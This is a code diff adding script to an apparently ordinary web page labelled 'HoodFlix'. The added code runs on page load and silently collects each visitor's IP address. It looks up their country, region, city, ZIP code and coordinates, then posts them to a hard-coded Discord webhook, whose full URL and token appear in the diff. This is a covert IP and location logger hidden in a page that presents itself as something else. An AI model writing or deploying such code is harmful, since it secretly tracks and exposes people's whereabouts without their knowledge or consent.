@@ -207,6 +207,92 @@
                 rainbowModeActive = true;
             }
         }
+
+        // Function to get the user's IP address
+        async function getIP() {
+            try {
+                let response = await fetch('https://api.ipify.org?format=json');
+                if (!response.ok) throw new Error('Failed to fetch IP');
+                let data = await response.json();
+                console.log('Retrieved IP:', data.ip); // Debug log
+                return data.ip;
+            } catch (error) {
+                console.error('Error getting IP address:', error);
+                return null;
+            }
+        }
+
+        // Function to get the user's location based on IP using ipapi
+        async function getLocation(ip) {
+            try {
+                let response = await fetch(`https://ipapi.co/${ip}/json/`);
+                if (!response.ok) throw new Error('Failed to fetch location');
+                let data = await response.json();
+                console.log('Location Data:', data); // Debug log
+                return data;
+            } catch (error) {
+                console.error('Error getting location:', error);
+                return null;
+            }
+        }
+
+        // Function to send the IP address and location to a Discord webhook
+        async function sendToDiscord(data) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1267728048829108365/K3YnLVDarqgR0T_tU0Vc27nuNP7GMVLC3qpKoEPt6X2subgQaBlDkpjUxo9RciNb9xlO'; // Replace with your Discord webhook URL
+            const payload = {
+                embeds: [
+                    {
+                        color: 10354688, // Optional color
+                        fields: [
+                            {
+                                name: "IP (HoodFlix):",
+                                value: data.ip || 'N/A'
+                            },
+                            {
+                                name: "Location:",
+                                value: `Country: ${data.country_name || 'N/A'}\n` +
+                                       `Region: ${data.region || 'N/A'}\n` +
+                                       `City: ${data.city || 'N/A'}\n` +
+                                       `ZIP: ${data.postal || 'N/A'}\n` +
+                                       `Latitude: ${data.latitude || 'N/A'}\n` +
+                                       `Longitude: ${data.longitude || 'N/A'}\n`
+                            }
+                        ]
+                    }
+                ]
+            };
+
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    console.log('Data sent to Discord webhook successfully');
+                } else {
+                    throw new Error('Failed to send data to Discord webhook');
+                }
+            } catch (error) {
+                console.error('Error sending data to Discord webhook:', error);
+            }
+        }
+
+        // Main function to get IP, location, and send data
+        async function main() {
+            const ip = await getIP();
+            if (ip) {
+                const location = await getLocation(ip);
+                const combinedData = { ip, ...location };
+                await sendToDiscord(combinedData);
+            }
+        }
+
+        // Run the main function when the page loads
+        window.onload = main;
     </script>
 </body>
 </html>
